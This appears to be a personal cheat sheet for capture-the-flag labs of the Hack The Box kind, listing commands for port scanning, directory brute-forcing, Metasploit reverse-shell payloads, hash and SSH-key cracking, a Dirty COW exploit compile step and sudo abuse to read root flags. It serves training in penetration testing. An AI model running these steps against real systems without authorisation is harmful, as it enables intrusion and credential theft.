Nmap fast scan full ports:

nmap -p- --min-rate 10000 <ip>

Following command can give the comma seperated port list:

cat nmap_output.txt | cut -d'/' -f1 | tr '\n' ', ' | sed 's/, $/\n/'

nmap command to fast scan UDP ports:

sudo nmap -vvv -sU -p- --min-rate 5000 --max-retries 1 -oA udp-scan <IP>

Search for the open UDP ports from the output with following command:

cat udp-scan.nmap | grep -v -e 'no-response' -e "closed" 

nmap command vulnerability scan:

nmap --script vuln <IP>

Gobuster commands:
gobuster dir -u http://10.129.89.220/ -w /usr/share/wordlists/dirb/common.txt
Gobuster command with fast scan with speicifc extension type:
gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40

searchsploit <CMS Name/Package>
searchsploit -m <exploit> (to get the exact path of the exploit in kali machine)

metsaploit note:  

search exploit in msfconsole:
search <Software Name>
Always run "check" command before running any exploit.
Try with both x86 and x64 payloads:

set payload linux/x64/meterpreter/reverse_tcp
set payload linux/x86/meterpreter/reverse_tcp

Lateral Moments:

Get interactive shell and set enviroment:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash

following command shows the files which can be run as sudo

sudo -l
serach string in directory:
grep -rni "passwd" www/ 

following file can show the websites other webiste's configuration if any internal application is running:

cat /etc/apache2/sites-enabled/internal.conf

Following command can be used to crack the hash:

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 hash.txt 

Following commadn can be use to crack thelinux  hashes with hashcat:

hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt --force

Run following command for local port forwarding to your host:

ssh jimmy@10.129.88.23 -L 52846:localhost:52846

Above command used to access a website running internally from your machine.

Following steps can be use to crack the password of private key (id_rsa).

sh2john.py id_rsa > hash

above command will convert the key in format that john the ripper can understand:

Then Following command can be used to crack the password

john --wordlist=/usr/share/wordlists/rockyou.txt hash

You can use following command to set permission of id_rsa key to use it.

chmod 600 id_rsa

following command use to decode the hex strings:

cat hype_key | xxd -r -p > id_rsa

following command will decrypt the encrypted ssh keys if you have the password:

openssl rsa -in hype_key_encrypted -out hype_key_decrypted

Note: sometimes you face error in connecting to ssh with valid key use following flag in that case:

ssh -i id_rsa root@10.129.84.172 -o PubkeyAcceptedKeyTypes=+ssh-rsa

command to compile dirtycow exploits:

gcc -pthread dc.c -o c -lcrypt

Following are the commands to get deleted data from external USB device:
mount
sudo grep -aPo '[a-fA-F0-9]{32}' /dev/sdb

Above command will recover the root flag from /dev/sdb

If wget commadn can be run as sudo without password, following command can be use to read flag:

sudo wget --input-file /root/root.txt

Login as another user from terminal:

sudo -u user /bin/bash
